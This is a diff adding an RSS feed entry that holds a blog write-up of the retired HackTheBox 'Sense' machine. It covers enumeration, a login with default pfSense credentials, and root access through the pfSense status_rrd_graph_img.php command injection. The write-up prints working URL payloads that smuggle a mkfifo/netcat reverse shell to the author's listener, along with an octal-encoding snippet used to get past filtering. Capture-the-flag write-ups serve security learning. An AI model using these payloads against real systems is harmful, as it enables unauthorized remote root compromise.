@@ -4,8 +4,197 @@
         <link>/posts/</link>
         <description>Recent content in Posts on Hello World. I am Dito Prabowo</description>
         <generator>Hugo -- gohugo.io</generator>
-        <lastBuildDate>Mon, 25 Oct 2021 19:50:30 +0700</lastBuildDate>
+        <lastBuildDate>Mon, 25 Oct 2021 20:27:53 +0700</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Recap HTB: Sense</title>
+            <link>/posts/recap-htb-sense/</link>
+            <pubDate>Mon, 25 Oct 2021 20:27:53 +0700</pubDate>
+            
+            <guid>/posts/recap-htb-sense/</guid>
+            <description>0x0 Intro    Name Values     Machine Name Sense   Difficulty Easy   Retired True   Release Date 1464 Days   Machine IP 10.10.10.60    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.60 --ulimit 10000 -- -sV -sC -A -T5 Open 10.10.10.60:80 Open 10.10.10.60:443 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack lighttpd 1.</description>
+            <content type="html"><![CDATA[<h2 id="0x0-intro">0x0 Intro</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align:right">Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td style="text-align:right">Sense</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td style="text-align:right">Easy</td>
+</tr>
+<tr>
+<td>Retired</td>
+<td style="text-align:right">True</td>
+</tr>
+<tr>
+<td>Release Date</td>
+<td style="text-align:right">1464 Days</td>
+</tr>
+<tr>
+<td>Machine IP</td>
+<td style="text-align:right">10.10.10.60</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x1-enumeration">0x1 Enumeration</h2>
+<h3 id="nmaprustscan">Nmap/Rustscan</h3>
+<p>Lets start to enumerate the machine first, using this command :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.60 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5
+
+Open 10.10.10.60:80
+Open 10.10.10.60:443
+
+PORT    STATE SERVICE    REASON  VERSION
+80/tcp  open  http       syn-ack lighttpd 1.4.35
+| http-methods:
+|_  Supported Methods: HEAD POST OPTIONS
+|_http-title: Did not follow redirect to https://10.10.10.60/
+|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+443/tcp open  ssl/https? syn-ack
+|_ssl-date: TLS randomness does not represent time
+
+</code></pre></div><p>Looking for the result, open port just 80 and 443 it mean web server http and https.</p>
+<h3 id="site">Site</h3>
+<p>The page is just a login page from pfsense :</p>
+<p><img src="/img/htbsense01.png" alt=""></p>
+<p>Lets go to try default credential for login.</p>
+<p>found this in pfsense document :</p>
+<pre tabindex="0"><code>Default Username and Password
+The default credentials for a pfSense® software installation are:
+
+Username : admin
+
+Password : pfsense
+</code></pre><p>But not work :(</p>
+<h3 id="directory-bruteforce">Directory Bruteforce</h3>
+<p>Lets try to enumerate with other options, i try to bruteforce directory using gobuster :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u https://10.10.10.60/ -k -w ~/wordlist/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">125</span> -x txt,php,html
+
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://10.10.10.60/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">125</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /home/dito/wordlist/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,html
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2021/10/25 21:20:34 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/themes               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/themes/<span style="color:#f92672">]</span>
+/stats.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 329<span style="color:#f92672">]</span>
+/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/css/<span style="color:#f92672">]</span>
+/help.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/includes/<span style="color:#f92672">]</span>
+/edit.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+/system.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+/license.php          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6692<span style="color:#f92672">]</span>
+/status.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+/javascript           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/javascript/<span style="color:#f92672">]</span>
+/changelog.txt        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 271<span style="color:#f92672">]</span>
+/classes              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/classes/<span style="color:#f92672">]</span>
+/exec.php             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6689<span style="color:#f92672">]</span>
+/widgets              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/widgets/<span style="color:#f92672">]</span>
+/graph.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6690<span style="color:#f92672">]</span>
+/tree                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/tree/<span style="color:#f92672">]</span>
+/wizard.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6691<span style="color:#f92672">]</span>
+/shortcuts            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/shortcuts/<span style="color:#f92672">]</span>
+/pkg.php              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6688<span style="color:#f92672">]</span>
+/installer            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/installer/<span style="color:#f92672">]</span>
+/wizards              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/wizards/<span style="color:#f92672">]</span>
+/xmlrpc.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 384<span style="color:#f92672">]</span>
+/interfaces.php       <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6695<span style="color:#f92672">]</span>
+/csrf                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://10.10.10.60/csrf/<span style="color:#f92672">]</span>
+/system-users.txt     <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 106<span style="color:#f92672">]</span>
+...
+</code></pre></div><p>First time scaning this, i&rsquo;m stuck because iam not using http and always redirect it to https, iam not aware of this and set negative status code 302 :kek: i got nothing for result, after realize that i change to https and use <code>-k</code> to disable cert check.</p>
+<p>i found interesting file <code>system-users.txt</code>, the other file i think is from pfsense itself.
+inside that file :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">####Support ticket###
+
+Please create the following user
+
+
+username: Rohit
+password: company defaults
+</code></pre></div><p>Knowing this lets try to login with username above and use default password from pfsense.
+its success login :D</p>
+<p><img src="/img/htbsense02.png" alt=""></p>
+<h2 id="0x2-shell-as-root">0x2 Shell as Root</h2>
+<h3 id="exploit">Exploit</h3>
+<p>pfsense version that installed on machine is :</p>
+<pre tabindex="0"><code>2.1.3-RELEASE (amd64)
+built on Thu May 01 15:52:13 EDT 2014
+FreeBSD 8.3-RELEASE-p16
+</code></pre><p>Searching in exploit-db.com url : <a href="https://www.exploit-db.com/exploits/43560,">https://www.exploit-db.com/exploits/43560,</a> there is exploit <code>pfSense &lt; 2.1.4 - 'status_rrd_graph_img.php' Command Injection</code>.</p>
+<p>Reading that exploit, we can simply craft payload to RCE in single url :</p>
+<pre tabindex="0"><code>&quot;https://&quot; + rhost + &quot;/status_rrd_graph_img.php?database=queues;&quot;+&quot;printf+&quot; + &quot;'&quot; + payload + &quot;'|sh&quot;
+</code></pre><p>So i test to craft payload with simple nc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://10.10.10.60/status_rrd_graph_img.php?database<span style="color:#f92672">=</span>queues;printf+%27nc%2010.10.14.18%209000%27|sh
+
+nc -lnvp <span style="color:#ae81ff">9000</span>
+Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
+Connection received on 10.10.10.60 <span style="color:#ae81ff">25723</span>
+</code></pre></div><p>Continue to make RCE payload :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://10.10.10.60/status_rrd_graph_img.php?database<span style="color:#f92672">=</span>queues;printf+%27rm%20-f%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&amp;1|nc%2010.10.14.18%209000%20%3E/tmp/f%27|sh
+</code></pre></div><p>but not work :(</p>
+<p>reading exploit on exploit db again, it need to craft to payload in octal</p>
+<pre tabindex="0"><code>payload = ''
+# encode payload in octal
+for char in command:
+	payload += (&quot;\\&quot; + oct(ord(char)).lstrip(&quot;0o&quot;))
+
+# i try this on local python to get right payload
+&gt;&gt;&gt; payload = ''
+&gt;&gt;&gt; command = 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 9000 &gt; /tmp/f'
+&gt;&gt;&gt; for char in command:
+...     payload += (&quot;\\&quot; + oct(ord(char)).lstrip(&quot;0o&quot;))
+...
+&gt;&gt;&gt; payload
+... \162\155\40\55\146\40\57\164\155\160\57\146\73\155\153\146\151\146\157\40\57\164\155\160\57\146\73\143\141\164\40\57\164\155\160\57\146\174\57\142\151\156\57\163\150\40\55\151\40\62\76\46\61\174\156\143\40\61\60\56\61\60\56\61\64\56\61\70\40\71\60\60\60\40\76\40\57\164\155\160\57\146
+
+then add it into url : 
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;printf+%27\162\155\40\55\146\40\57\164\155\160\57\146\73\155\153\146\151\146\157\40\57\164\155\160\57\146\73\143\141\164\40\57\164\155\160\57\146\174\57\142\151\156\57\163\150\40\55\151\40\62\76\46\61\174\156\143\40\61\60\56\61\60\56\61\64\56\61\70\40\71\60\60\60\40\76\40\57\164\155\160\57\146%27|sh|echo
+
+$ nc -lnvp 9000
+Listening on 0.0.0.0 9000
+Connection received on 10.10.10.60 59899
+sh: can't access tty; job control turned off
+# ls
+GW_WAN-quality.rrd
+WAN_DHCP-quality.rrd
+ipsec-packets.rrd
+ipsec-traffic.rrd
+system-mbuf.rrd
+system-memory.rrd
+system-processor.rrd
+system-states.rrd
+updaterrd.sh
+wan-packets.rrd
+wan-traffic.rrd
+# whoami
+root
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+</code></pre><p>Rooted :D :yay:</p>
+]]></content>
+        </item>
         
         <item>
             <title>I&#39;m Backkkk</title>
